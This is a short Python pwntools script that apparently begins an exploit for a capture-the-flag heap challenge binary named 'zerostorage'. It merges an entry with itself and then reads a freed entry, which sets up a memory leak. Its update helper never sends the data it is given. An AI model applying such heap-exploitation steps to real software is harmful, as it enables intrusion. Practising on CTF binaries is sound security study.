#!/usr/bin/env python

from pwn import *

def insert(size, string):
	p.sendline("1")
	p.recvuntil("Length of new entry: ")
	p.sendline(str(size))
	p.recvuntil("Enter your data: ")
	p.sendline(str(string))
	print p.recvline()
	p.recvuntil("Your choice: ")

def update(index, size, string):
	p.sendline("2")
	p.recvuntil("Entry ID: ")
	p.sendline(str(index))
	p.recvuntil("Length of entry: ")
	p.sendline(str(size))
	p.recvuntil("Enter your data: ")
	print p.recvline()
	p.recvuntil("Your choice: ")	

def merge(idfrom, idto):
	p.sendline("3")
	p.recvuntil("Merge from Entry ID: ")
	p.sendline(str(idfrom))
	p.recvuntil("Merge to Entry ID: ")
	p.sendline(str(idto))
	print p.recvline()
	p.recvuntil("Your choice: ")

def view(index):
	p.sendline("4")
	p.recvuntil("Entry ID: ")
	p.sendline(str(index))
	p.recvuntil(":")
	data = p.recvline()
	print data
	p.recvuntil("Your choice: ")	
	return data

if __name__ == '__main__':
	p = process("./zerostorage")
#	p = process("./zerostorage", env={"LD_PRELOAD":"./libc.so.6"})
	p.recvuntil("Your choice: ")
	insert(5, "AAAAA")
	insert(5, "BBBBB")
	merge(0, 0)
	print view(2)
